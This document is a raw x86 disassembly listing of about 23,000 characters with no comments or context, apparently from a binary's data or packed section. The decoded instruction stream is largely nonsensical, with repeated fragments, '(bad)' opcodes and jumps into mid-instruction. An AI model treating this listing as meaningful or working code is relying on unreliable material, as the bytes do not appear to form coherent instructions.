  4234a8:	ror    DWORD PTR [edx],cl
  4234aa:	jbe    0x423529
  4234ac:	int    0x6d
  4234ae:	jmp    0x4234b6
  4234b0:	add    DWORD PTR [eax-0x36923280],0x7006
  4234ba:	add    BYTE PTR [ebx],cl
  4234bc:	and    DWORD PTR [esi-0x369232cb],eax
  4234c2:	push   es
  4234c3:	xchg   esp,eax
  4234c4:	add    BYTE PTR [eax],al
  4234c6:	add    bh,dh
  4234c8:	and    DWORD PTR [esi-0x329232cb],eax
  4234ce:	ins    DWORD PTR es:[edi],dx
  4234cf:	int    0x76
  4234d1:	icebp  
  4234d2:	int    0x8d
  4234d4:	icebp  
  4234d5:	cmp    eax,ebp
  4234d7:	cmp    ecx,DWORD PTR [edi]
  4234d9:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234df:	push   ebx
  4234e0:	ror    ebp,cl
  4234e2:	lea    edi,[ebp+0x2f]
  4234e5:	rcl    ebx,1
  4234e7:	int    0x8d
  4234e9:	ins    DWORD PTR es:[edi],dx
  4234ea:	retf   0x8884
  4234ed:	or     DWORD PTR [esi-0x57],esi
  4234f0:	int    0x6d
  4234f2:	int    0x76
  4234f4:	icebp  
  4234f5:	int    0x8d
  4234f7:	icebp  
  4234f8:	cmp    ecx,DWORD PTR [edi]
  4234fa:	cmp    eax,ebp
  4234fc:	shl    edx,cl
  4234fe:	sub    bl,dl
  423500:	mov    ebp,0xcdd35392
  423505:	lea    edi,[ebp+0x2f]
  423508:	rcl    ebx,1
  42350a:	int    0x8d
  42350c:	adc    eax,0x3b1596cd
  423511:	or     al,0x3b
  423513:	cdq    
  423514:	shr    ebx,cl
  423516:	xchg   edx,eax
  423517:	shr    edx,cl
  423519:	sub    BYTE PTR [ebx+0x13],dl
  42351c:	xchg   ebx,edx
  42351e:	int    0x8d
  423520:	ins    DWORD PTR es:[edi],dx
  423521:	das    
  423522:	pop    ecx
  423523:	dec    esp
  423524:	mov    ch,cl
  423526:	push   es
  423527:	jo     0x423529
  423529:	add    BYTE PTR [eax],al
  42352b:	int    0x17
  42352d:	jo     0x42352f
  42352f:	add    BYTE PTR [eax],al
  423531:	cmp    eax,ebp
  423533:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423539:	jmp    0x2fd3:0x87d25328
  423540:	pop    ecx
  423541:	lea    ebp,[ecx-0x72f682c5]
  423547:	test   eax,0x76ca6dcd
  42354c:	test   eax,0xcdf18dcd
  423551:	xchg   esi,eax
  423552:	icebp  
  423553:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423556:	cdq    
  423557:	shr    edx,cl
  423559:	sub    bl,dl
  42355b:	jmp    0x4234ef
  42355d:	push   ebx
  42355e:	adc    ecx,ebp
  423560:	xchg   esi,eax
  423561:	jge    0x423592
  423563:	rcl    DWORD PTR [ebx],1
  423565:	int    0x96
  423567:	ins    DWORD PTR es:[edi],dx
  423568:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42356f:	icebp  
  423570:	int    0x8d
  423572:	icebp  
  423573:	cmp    eax,ebp
  423575:	cmp    ecx,DWORD PTR [edi]
  423577:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42357d:	push   ebx
  42357e:	ror    ebp,cl
  423580:	lea    edi,[ebp+0x2f]
  423583:	rcl    ebx,1
  423585:	int    0x8d
  423587:	ins    DWORD PTR es:[edi],dx
  423588:	retf   0x8884
  42358b:	or     DWORD PTR [esi-0x57],esi
  42358e:	int    0x6d
  423590:	int    0x76
  423592:	icebp  
  423593:	int    0x8d
  423595:	icebp  
  423596:	cmp    eax,ebp
  423598:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42359e:	repnz sub BYTE PTR [ebx-0x2d],dl
  4235a2:	int    0x8d
  4235a4:	jge    0x4235d5
  4235a6:	rcl    ebx,1
  4235a8:	int    0x8d
  4235aa:	pop    ebp
  4235ab:	int    0x96
  4235ad:	pop    ebp
  4235ae:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235b1:	cdq    
  4235b2:	shr    ebx,cl
  4235b4:	xchg   edx,eax
  4235b5:	shr    edx,cl
  4235b7:	sub    BYTE PTR [ebx+0x13],dl
  4235ba:	xchg   ebx,edx
  4235bc:	int    0x8d
  4235be:	ins    DWORD PTR es:[edi],dx
  4235bf:	das    
  4235c0:	pop    ecx
  4235c1:	dec    esp
  4235c2:	mov    ch,cl
  4235c4:	push   es
  4235c5:	xchg   esp,eax
  4235c6:	add    BYTE PTR [eax],al
  4235c8:	add    ch,cl
  4235ca:	pop    ss
  4235cb:	xchg   esp,eax
  4235cc:	add    BYTE PTR [eax],al
  4235ce:	add    BYTE PTR [ebx],bh
  4235d0:	lds    edi,FWORD PTR [ebx]
  4235d2:	cdq    
  4235d3:	sar    DWORD PTR [ebp+0x28ead392],cl
  4235d9:	push   ebx
  4235da:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235e0:	test   eax,0x8d097d3b
  4235e5:	test   eax,0x76ca6dcd
  4235ea:	test   eax,0xcdf18dcd
  4235ef:	xchg   esi,eax
  4235f0:	icebp  
  4235f1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235f4:	cdq    
  4235f5:	shr    edx,cl
  4235f7:	sub    bl,dl
  4235f9:	jmp    0x42358d
  4235fb:	push   ebx
  4235fc:	adc    ecx,ebp
  4235fe:	xchg   esi,eax
  4235ff:	jge    0x423630
  423601:	rcl    DWORD PTR [ebx],1
  423603:	int    0x96
  423605:	ins    DWORD PTR es:[edi],dx
  423606:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42360d:	xor    eax,0x3b358dcd
  423612:	(bad)  
  423614:	(bad)
  423617:	sub    bl,dl
  423619:	mov    ebp,0xcdd35392
  42361e:	lea    ebx,[ebp-0x33]
  423621:	xchg   esi,eax
  423622:	pop    ebp
  423623:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423626:	cdq    
  423627:	shr    ebx,cl
  423629:	xchg   edx,eax
  42362a:	shr    edx,cl
  42362c:	sub    BYTE PTR [ebx+0x13],dl
  42362f:	das    
  423630:	rcl    ebx,1
  423632:	xchg   DWORD PTR [esi+0x7d],esi
  423635:	or     dh,BYTE PTR [esi+0x7d]
  423638:	int    0x76
  42363a:	jge    0x423609
  42363c:	lea    ecx,ds:0xb2f7d43
  423642:	(bad)  
  423643:	inc    DWORD PTR [eax]
  423645:	add    ch,cl
  423647:	jbe    0x4236a6
  423649:	int    0x8d
  42364b:	pop    ebp
  42364c:	cmp    ecx,DWORD PTR [edi]
  42364e:	shl    edx,cl
  423650:	sub    BYTE PTR [ebx],bh
  423652:	(bad)
  423655:	xchg   edx,eax
  423656:	push   ebx
  423657:	ror    ebp,cl
  423659:	lea    ecx,ds:0xcdd3d12f
  42365f:	lea    edx,[ebp-0x142cf3c5]
  423665:	xchg   edx,eax
  423666:	push   ebx
  423667:	ror    ebp,cl
  423669:	lea    edx,[ebp-0xd2cf0c5]
  42366f:	sub    BYTE PTR [ebx-0x2d],dl
  423672:	or     dh,BYTE PTR [esi+0x35]
  423675:	int    0x76
  423677:	popf   
  423678:	int    0x8d
  42367a:	popf   
  42367b:	cmp    ecx,DWORD PTR [edi]
  42367d:	shl    edx,cl
  42367f:	sub    BYTE PTR [ebx],bh
  423681:	(bad)
  423684:	xchg   edx,eax
  423685:	push   ebx
  423686:	ror    ebp,cl
  423688:	lea    ebx,[ebp+0x3b9d96cd]
  42368e:	or     al,0xd3
  423690:	jmp    0x423624
  423692:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423698:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42369e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  4236a4:	in     al,dx
  4236a5:	sbb    al,0xcd
  4236a7:	jbe    0x423646
  4236a9:	int    0x8d
  4236ab:	popf   
  4236ac:	cmp    eax,ebp
  4236ae:	cmp    ecx,DWORD PTR [edi]
  4236b0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4236b6:	push   ebx
  4236b7:	rol    DWORD PTR [edi+0x760a5576],cl
  4236bd:	push   ebp
  4236be:	int    0x76
  4236c0:	popf   
  4236c1:	int    0x8d
  4236c3:	popf   
  4236c4:	cmp    eax,ebp
  4236c6:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4236cc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4236d0:	int    0x8d
  4236d2:	lods   eax,DWORD PTR ds:[esi]
  4236d3:	xor    edi,DWORD PTR [ebp-0x33]
  4236d6:	jbe    0x423675
  4236d8:	int    0x96
  4236da:	popf   
  4236db:	cmp    eax,ebp
  4236dd:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236e3:	mov    ebp,0xcdd25392
  4236e8:	xchg   esi,eax
  4236e9:	push   ebp
  4236ea:	das    
  4236eb:	rcl    edx,1
  4236ed:	inc    ebx
  4236ee:	shr    DWORD PTR [edi],cl
  4236f0:	pop    es
  4236f1:	adc    ebp,edi
  4236f3:	add    BYTE PTR [eax],al
  4236f5:	int    0x76
  4236f7:	stc    
  4236f8:	int    0x76
  4236fa:	stc    
  4236fb:	int    0x76
  4236fd:	std    
  4236fe:	or     dh,BYTE PTR [esi+0x35]
  423701:	int    0x76
  423703:	mov    ch,cl
  423705:	lea    esp,ds:0x3b2596cd
  42370b:	or     al,0xd3
  42370d:	jmp    0x4236a1
  42370f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423715:	add    BYTE PTR [eax+0x5328ead3],0x13
  42371c:	jno    0x4236eb
  42371e:	lea    esp,[ebp-0x33]
  423721:	xchg   esi,eax
  423722:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423726:	cdq    
  423727:	shr    ebx,cl
  423729:	xchg   edx,eax
  42372a:	shr    edx,cl
  42372c:	sub    BYTE PTR [ebx+0x13],dl
  42372f:	jno    0x4236fe
  423731:	(bad)  
  423732:	stc    
  423733:	int    0x96
  423735:	stc    
  423736:	add    dh,dl
  423738:	xor    eax,0x993b0c3b
  42373d:	shr    ebx,cl
  42373f:	xchg   edx,eax
  423740:	shr    edx,cl
  423742:	sub    BYTE PTR [ebx+0x13],dl
  423745:	jno    0x423747
  423747:	jo     0x42375d
  423749:	int    0x8d
  42374b:	stc    
  42374c:	int    0x96
  42374e:	stc    
  42374f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423752:	cdq    
  423753:	shr    ebx,cl
  423755:	xchg   edx,eax
  423756:	shr    edx,cl
  423758:	sub    BYTE PTR [ebx+0x13],dl
  42375b:	or     dh,BYTE PTR [esi+0x65]
  42375e:	inc    ebx
  42375f:	jge    0x423790
  423761:	add    eax,0x808080ab
  423766:	int    0x76
  423768:	stc    
  423769:	in     al,dx
  42376a:	(bad)  
  42376b:	int    0x96
  42376d:	or     dh,BYTE PTR gs:[esi-0x53]
  423771:	push   ecx
  423772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423773:	lods   eax,DWORD PTR ds:[esi]
  423774:	int    0x8d
  423776:	lods   eax,DWORD PTR ds:[esi]
  423777:	shr    ebx,cl
  423779:	xchg   edx,eax
  42377a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42377d:	lods   eax,DWORD PTR ds:[esi]
  42377e:	sub    BYTE PTR [ebx-0x2d],dl
  423781:	int    0x8d
  423783:	jne    0x42374f
  423785:	dec    esp
  423786:	or     DWORD PTR [ecx],0x8dcd304c
  42378c:	mov    ch,0xcd
  42378e:	lea    esi,[ebp+0x3bb596cd]
  423794:	or     al,0x3b
  423796:	cdq    
  423797:	shr    edx,cl
  423799:	sub    bl,dl
  42379b:	jmp    0x42372f
  42379d:	push   ebx
  42379e:	adc    ecx,ebp
  4237a0:	xchg   esi,eax
  4237a1:	mov    ch,0x87
  4237a3:	jge    0x423772
  4237a5:	jbe    0x423754
  4237a7:	cmp    edx,ebp
  4237a9:	add    al,0xad
  4237ab:	std    
  4237ac:	add    al,0xea
  4237ae:	std    
  4237af:	shr    ebx,cl
  4237b1:	sub    BYTE PTR [edi+0x3bd353d2],al
  4237b7:	leave  
  4237b8:	int    0x8d
  4237ba:	std    
  4237bb:	int    0x96
  4237bd:	std    
  4237be:	shr    edx,cl
  4237c0:	xchg   edx,eax
  4237c1:	shr    ebx,cl
  4237c3:	sub    BYTE PTR [ebx-0x1d],dl
  4237c6:	cmp    ebx,ecx
  4237c8:	inc    ebx
  4237c9:	rcl    dh,cl
  4237cb:	mov    ds:0xcd8876cd,eax
  4237d0:	lea    ebp,ds:0xcd2d96cd
  4237d6:	add    DWORD PTR [ecx],edx
  4237d8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237e2:	shr    edx,cl
  4237e4:	sub    BYTE PTR [ebx+0x13],dl
  4237e7:	jno    0x4237b6
  4237e9:	(bad)  
  4237ea:	stc    
  4237eb:	int    0x96
  4237ed:	stc    
  4237ee:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237f1:	cdq    
  4237f2:	shr    ebx,cl
  4237f4:	xchg   edx,eax
  4237f5:	shr    edx,cl
  4237f7:	sub    BYTE PTR [ebx+0x13],dl
  4237fa:	jno    0x4237fc
  4237fc:	(bad)  
  4237fd:	jne    0x4237ff
  4237ff:	jo     0x42381d
  423801:	int    0x76
  423803:	or     dh,BYTE PTR gs:[esi+0x75]
  423807:	int    0x76
  423809:	xor    eax,0xcdfd760a
  42380e:	jbe    0x42380d
  423810:	cmp    ecx,ebx
  423812:	add    al,0xbd
  423814:	test   ah,dl
  423816:	xor    ecx,ebp
  423818:	jbe    0x42388f
  42381a:	int    0x14
  42381c:	mov    ch,cl
  42381e:	jbe    0x423895
  423820:	int    0x84
  423822:	mov    BYTE PTR [ebx],bh
  423824:	jns    0x423861
  423826:	aad    0xd3
  423828:	lods   eax,DWORD PTR ds:[esi]
  423829:	sub    bl,dl
  42382b:	repz xchg edx,eax
  42382d:	push   ebx
  42382e:	ror    ch,cl
  423830:	xchg   esi,eax
  423831:	jne    0x42383d
  423833:	test   BYTE PTR [edx-0x33],cl
  423836:	jbe    0x423835
  423838:	add    al,0xd3
  42383a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423841:	xlat   BYTE PTR ds:[ebx]
  423842:	int    0x76
  423844:	std    
  423845:	cmp    ecx,ebx
  423847:	add    al,0xbd
  423849:	test   ah,dl
  42384b:	xor    ecx,ebp
  42384d:	jbe    0x4238c4
  42384f:	int    0x14
  423851:	mov    ch,cl
  423853:	jbe    0x4238ca
  423855:	int    0x84
  423857:	mov    BYTE PTR [ebx],bh
  423859:	jns    0x423896
  42385b:	aad    0xd3
  42385d:	lods   eax,DWORD PTR ds:[esi]
  42385e:	sub    bl,dl
  423860:	repz xchg edx,eax
  423862:	push   ebx
  423863:	ror    ch,cl
  423865:	xchg   esi,eax
  423866:	jne    0x423872
  423868:	test   BYTE PTR [edx-0x33],cl
  42386b:	jbe    0x42386a
  42386d:	add    al,0xd3
  42386f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423876:	xlat   BYTE PTR ds:[ebx]
  423877:	int    0x76
  423879:	jne    0x423885
  42387b:	jbe    0x42388a
  42387d:	int    0x76
  42387f:	mov    ch,0xcd
  423881:	lea    esi,[ebp+0xf3bc53b]
  423887:	shl    edx,cl
  423889:	sub    bl,dl
  42388b:	mov    ebp,0xcdd35392
  423890:	(bad)  
  423891:	stc    
  423892:	or     dh,BYTE PTR [esi+0x25]
  423895:	leave  
  423896:	jbe    0x423864
  423898:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42389f:	imul   edx,ebp,0x8d0a0c69
  4238a5:	gs adc bh,dl
  4238a8:	into   
  4238a9:	and    DWORD PTR [esi-0x32fad0cb],eax
  4238af:	add    BYTE PTR [eax+0xd96cd80],0xcd
  4238b6:	sar    DWORD PTR [ebx],cl
  4238b8:	lds    ecx,FWORD PTR [edx]
  4238ba:	jbe    0x423869
  4238bc:	rol    esi,cl
  4238be:	lods   eax,DWORD PTR ds:[esi]
  4238bf:	xchg   edx,eax
  4238c0:	or     dh,BYTE PTR [esi-0x30]
  4238c3:	int    0xd3
  4238c5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238c8:	lods   eax,DWORD PTR ds:[esi]
  4238c9:	sub    BYTE PTR [ebx+0x76],dl
  4238cc:	lods   eax,DWORD PTR ds:[esi]
  4238cd:	retf   0x858c
  4238d0:	int3   
  4238d1:	das    
  4238d2:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  4238dd:	retf   
  4238de:	inc    ebx
  4238df:	rcl    esi,cl
  4238e1:	jle    0x4238b0
  4238e3:	jbe    0x42389a
  4238e5:	int    0x8d
  4238e7:	mov    ch,0xcd
  4238e9:	jbe    0x4238a0
  4238eb:	int    0x96
  4238ed:	mov    ch,0x3b
  4238ef:	jns    0x42392c
  4238f1:	or     al,0xd3
  4238f3:	lods   eax,DWORD PTR ds:[esi]
  4238f4:	sub    bl,dl
  4238f6:	jmp    0x42388a
  4238f8:	push   ebx
  4238f9:	jge    0x4238c8
  4238fb:	jbe    0x423962
  4238fd:	cmp    edi,DWORD PTR [ecx-0x2d]
  423900:	lods   eax,DWORD PTR ds:[esi]
  423901:	sub    BYTE PTR [ebx+0x76],dl
  423904:	lods   eax,DWORD PTR ds:[esi]
  423905:	cmp    edx,ebp
  423907:	xchg   DWORD PTR [ebp-0x33],edi
  42390a:	jbe    0x4238dc
  42390c:	add    al,0xea
  42390e:	std    
  42390f:	add    al,0xad
  423911:	std    
  423912:	shr    ebx,cl
  423914:	sub    BYTE PTR [edi+0x3b1353f1],al
  42391a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423921:	and    DWORD PTR [esi-0x323329cb],eax
  423927:	jbe    0x42394e
  423929:	in     al,dx
  42392a:	and    cl,ch
  42392c:	jbe    0x423927
  42392e:	int    0x8d
  423930:	stc    
  423931:	cmp    eax,ebp
  423933:	cmp    ecx,DWORD PTR [edi]
  423935:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42393b:	push   ebx
  42393c:	ror    ebp,cl
  42393e:	(bad)  
  42393f:	stc    
  423940:	int    0x96
  423942:	stc    
  423943:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423946:	cdq    
  423947:	shr    ebx,cl
  423949:	xchg   edx,eax
  42394a:	shr    edx,cl
  42394c:	sub    BYTE PTR [ebx+0x13],dl
  42394f:	inc    ebx
  423950:	jge    0x423981
  423952:	add    eax,0x80809223
  423957:	int    0x76
  423959:	or     eax,0xa886ccd
  42395e:	out    0xb5,al
  423960:	leave  
  423961:	jbe    0x423988
  423963:	mov    dl,0x21
  423965:	xchg   BYTE PTR ds:0x393576c9,dh
  42396b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423971:	dec    ecx
  423972:	mov    al,ds:0x76c93586
  423977:	lods   eax,DWORD PTR ds:[esi]
  423978:	imul   esp,DWORD PTR [ecx],0x76c93586
  42397e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423982:	xor    eax,0xcd3d760a
  423987:	jbe    0x423911
  423989:	int    0x8d
  42398b:	lods   eax,DWORD PTR ds:[esi]
  42398c:	int    0x96
  42398e:	lods   eax,DWORD PTR ds:[esi]
  42398f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423992:	jmp    0x423926
  423994:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42399a:	adc    esi,DWORD PTR [ecx-0x33]
  42399d:	lea    edx,[ebp+0x3b9596cd]
  4239a3:	or     al,0xd3
  4239a5:	jmp    0x423939
  4239a7:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239ad:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239b4:	jno    0x423983
  4239b6:	lea    esp,[ebp-0x33]
  4239b9:	xchg   esi,eax
  4239ba:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4239be:	cdq    
  4239bf:	shr    ebx,cl
  4239c1:	xchg   edx,eax
  4239c2:	shr    edx,cl
  4239c4:	sub    BYTE PTR [ebx+0x13],dl
  4239c7:	jno    0x423996
  4239c9:	lea    esi,[ebp+0x3bb596cd]
  4239cf:	or     al,0x3b
  4239d1:	cdq    
  4239d2:	shr    ebx,cl
  4239d4:	xchg   edx,eax
  4239d5:	shr    edx,cl
  4239d7:	sub    BYTE PTR [ebx+0x13],dl
  4239da:	jno    0x4239dc
  4239dc:	jo     0x4239f2
  4239de:	or     dh,BYTE PTR [esi+0x65]
  4239e1:	int    0x76
  4239e3:	mov    ch,cl
  4239e5:	lea    ebp,[ebp+0x3bad96cd]
  4239eb:	or     al,0xd3
  4239ed:	jmp    0x423981
  4239ef:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239f5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239fc:	jno    0x4239cb
  4239fe:	lea    edx,[ebp+0x3b9596cd]
  423a04:	or     al,0x3b
  423a06:	cdq    
  423a07:	shr    ebx,cl
  423a09:	xchg   edx,eax
  423a0a:	shr    edx,cl
  423a0c:	sub    BYTE PTR [ebx+0x13],dl
  423a0f:	jno    0x4239de
  423a11:	lea    esi,[ebp+0xb596cd]
  423a17:	(bad)  
  423a18:	cmp    eax,0x993b0c3b
  423a1d:	shr    ebx,cl
  423a1f:	xchg   edx,eax
  423a20:	shr    edx,cl
  423a22:	sub    BYTE PTR [ebx+0x13],dl
  423a25:	jno    0x423a27
  423a27:	jo     0x423a3d
  423a29:	int    0x8d
  423a2b:	mov    ch,0xa
  423a2d:	jbe    0x4239dc
  423a2f:	int    0x76
  423a31:	mov    ch,0x3b
  423a33:	or     al,0x3b
  423a35:	jns    0x423a0a
  423a37:	jmp    0x4239cb
  423a39:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a3f:	jbe    0x423aa6
  423a41:	inc    ebx
  423a42:	jge    0x423a73
  423a44:	add    eax,0x8080853c
  423a49:	int    0x8d
  423a4b:	mov    ch,0xcd
  423a4d:	xchg   esi,eax
  423a4e:	mov    ch,0x3b
  423a50:	or     al,0x3b
  423a52:	cdq    
  423a53:	shr    ebx,cl
  423a55:	xchg   edx,eax
  423a56:	shr    edx,cl
  423a58:	sub    BYTE PTR [ebx+0x13],dl
  423a5b:	inc    ebx
  423a5c:	lea    ebp,[ebp-0x7ab2fad1]
  423a62:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a69:	and    eax,0x192ebd3
  423a6e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a74:	mov    ch,0xcd
  423a76:	lea    esi,[ebp+0x192ebd3]
  423a7c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a82:	lea    esi,ds:0xd3358dcd
  423a88:	jmp    0x423a1c
  423a8a:	add    DWORD PTR [edx],eax
  423a8c:	scas   eax,DWORD PTR es:[edi]
  423a8d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a91:	aaa    
  423a92:	sbb    al,0x0
  423a94:	add    BYTE PTR [eax],al
  423a96:	add    BYTE PTR [edi+esi*1],0x24
  423a9a:	add    BYTE PTR [eax],al
  423a9c:	add    BYTE PTR [eax+0x24cfcf],al
  423aa2:	add    BYTE PTR [eax],al
  423aa4:	jno    0x423aa6
  423aa6:	(bad)  
  423aa7:	cmp    eax,0x1ccfcf
  423aac:	add    BYTE PTR [eax],al
  423aae:	add    dh,dl
  423ab0:	lods   eax,DWORD PTR ds:[esi]
  423ab1:	jno    0x423a80
  423ab3:	lea    ecx,ds:0xcd4c9100
  423ab9:	lea    esi,[ebp+0x4]
  423abc:	shl    DWORD PTR [eax],cl
  423abe:	jno    0x423b30
  423ac0:	mov    ebp,0xefef
  423ac5:	or     dh,BYTE PTR [esi-0x30]
  423ac8:	int    0x76
  423aca:	mov    ch,cl
  423acc:	lea    ebp,ds:0xcd2d96cd
  423ad2:	add    DWORD PTR [ecx],edx
  423ad4:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423ade:	shr    edx,cl
  423ae0:	sub    BYTE PTR [ebx+0x13],dl
  423ae3:	jno    0x423ab2
  423ae5:	lea    esi,[ebp+0x3bb596cd]
  423aeb:	or     al,0x3b
  423aed:	cdq    
  423aee:	shr    ebx,cl
  423af0:	xchg   edx,eax
  423af1:	shr    edx,cl
  423af3:	sub    BYTE PTR [ebx+0x13],dl
  423af6:	jno    0x423af8
  423af8:	(bad)  
  423af9:	add    BYTE PTR gs:[eax+0x1c],dh
  423afd:	int    0x76
  423aff:	rcl    bl,1
  423b01:	ins    DWORD PTR es:[edi],dx
  423b02:	xchg   edx,eax
  423b03:	cmp    ecx,ecx
  423b05:	inc    ebx
  423b06:	leave  
  423b07:	int    0x76
  423b09:	mov    ch,cl
  423b0b:	lea    ebp,ds:0x811101cd
  423b11:	add    BYTE PTR [eax-0x29d26933],0x54
  423b18:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b1b:	cdq    
  423b1c:	shr    ebx,cl
  423b1e:	xchg   edx,eax
  423b1f:	shr    edx,cl
  423b21:	sub    BYTE PTR [ebx+0x13],dl
  423b24:	jno    0x423af3
  423b26:	lea    esi,[ebp+0x3bb596cd]
  423b2c:	or     al,0x3b
  423b2e:	cdq    
  423b2f:	shr    ebx,cl
  423b31:	xchg   edx,eax
  423b32:	shr    edx,cl
  423b34:	sub    BYTE PTR [ebx+0x13],dl
  423b37:	jno    0x423b39
  423b39:	(bad)  
  423b3a:	jne    0x423b3c
  423b3c:	jo     0x423b5a
  423b3e:	int    0x76
  423b40:	lods   eax,DWORD PTR ds:[esi]
  423b41:	or     dh,BYTE PTR [esi+0x75]
  423b44:	int    0x76
  423b46:	cmp    eax,0xecfd760a
  423b4b:	cmp    BYTE PTR [ebx],bh
  423b4d:	or     al,0x3b
  423b4f:	cdq    
  423b50:	shr    ebx,cl
  423b52:	xchg   edx,eax
  423b53:	shr    edx,cl
  423b55:	sub    BYTE PTR [ebx+0x13],dl
  423b58:	jno    0x423b27
  423b5a:	lea    esi,[ebp+0x3bb596cd]
  423b60:	or     al,0x3b
  423b62:	cdq    
  423b63:	shr    ebx,cl
  423b65:	xchg   edx,eax
  423b66:	shr    edx,cl
  423b68:	sub    BYTE PTR [ebx+0x13],dl
  423b6b:	jno    0x423b6d
  423b6d:	(bad)  
  423b6e:	lods   eax,DWORD PTR ds:[esi]
  423b6f:	add    BYTE PTR [eax+0x1c],dh
  423b72:	int    0x76
  423b74:	std    
  423b75:	or     dh,BYTE PTR [esi+0x1d]
  423b78:	int    0x76
  423b7a:	jne    0x423b86
  423b7c:	out    0x55,al
  423b7e:	or     dh,BYTE PTR [esi-0x30]
  423b81:	leave  
  423b82:	jbe    0x423b21
  423b84:	inc    ecx
  423b85:	and    DWORD PTR [esi+0x5576cd35],eax
  423b8b:	int    0x8d
  423b8d:	push   ebp
  423b8e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b91:	or     al,0xd3
  423b93:	lods   eax,DWORD PTR ds:[esi]
  423b94:	sub    bl,dl
  423b96:	jmp    0x423b2a
  423b98:	push   ebx
  423b99:	ror    DWORD PTR [edx],cl
  423b9b:	jbe    0x423be2
  423b9d:	int    0x76
  423b9f:	push   ebp
  423ba0:	int    0x8d
  423ba2:	push   ebp
  423ba3:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ba6:	or     al,0xd3
  423ba8:	lods   eax,DWORD PTR ds:[esi]
  423ba9:	sub    bl,dl
  423bab:	jmp    0x423b3f
  423bad:	push   ebx
  423bae:	ror    DWORD PTR [edx],cl
  423bb0:	jbe    0x423bbf
  423bb2:	leave  
  423bb3:	jbe    0x423b4a
  423bb5:	dec    eax
  423bb6:	and    DWORD PTR [esi-0x528936cb],eax
  423bbc:	ret    0x8621
  423bbf:	xor    eax,0xcd5576cd
  423bc4:	lea    edx,[ebp+0x3b]
  423bc7:	jns    0x423c04
  423bc9:	or     al,0xd3
  423bcb:	jmp    0x423b5f
  423bcd:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bd3:	lea    ebx,ds:0x52f7d43
  423bd9:	push   ss
  423bda:	xchg   DWORD PTR [eax-0x6d241480],eax
  423be0:	add    BYTE PTR [eax-0x326a7233],0x76
  423be7:	xchg   ebp,eax
  423be8:	int    0x96
  423bea:	inc    ebp
  423beb:	cmp    eax,ebp
  423bed:	cmp    ecx,DWORD PTR [edi]
  423bef:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423bf5:	push   ebx
  423bf6:	jge    0x423bc5
  423bf8:	jbe    0x423c17
  423bfa:	xor    edx,edx
  423bfc:	cmp    ebx,edx
  423bfe:	clc    
  423bff:	add    cl,BYTE PTR [edx]
  423c01:	jbe    0x423c10
  423c03:	int    0x76
  423c05:	lods   eax,DWORD PTR ds:[esi]
  423c06:	int    0x8d
  423c08:	lods   eax,DWORD PTR ds:[esi]
  423c09:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c0c:	or     al,0xd3
  423c0e:	jmp    0x423ba2
  423c10:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c16:	lea    ecx,ds:0x16d87d43
  423c1c:	int    0x76
  423c1e:	lods   eax,DWORD PTR ds:[esi]
  423c1f:	int    0x8d
  423c21:	lods   eax,DWORD PTR ds:[esi]
  423c22:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c25:	or     al,0xd3
  423c27:	lods   eax,DWORD PTR ds:[esi]
  423c28:	sub    bl,dl
  423c2a:	jmp    0x423bbe
  423c2c:	push   ebx
  423c2d:	ror    DWORD PTR [edx],cl
  423c2f:	jbe    0x423c3e
  423c31:	int    0x76
  423c33:	xchg   ebp,eax
  423c34:	int    0x8d
  423c36:	xchg   ebp,eax
  423c37:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c3a:	or     al,0xd3
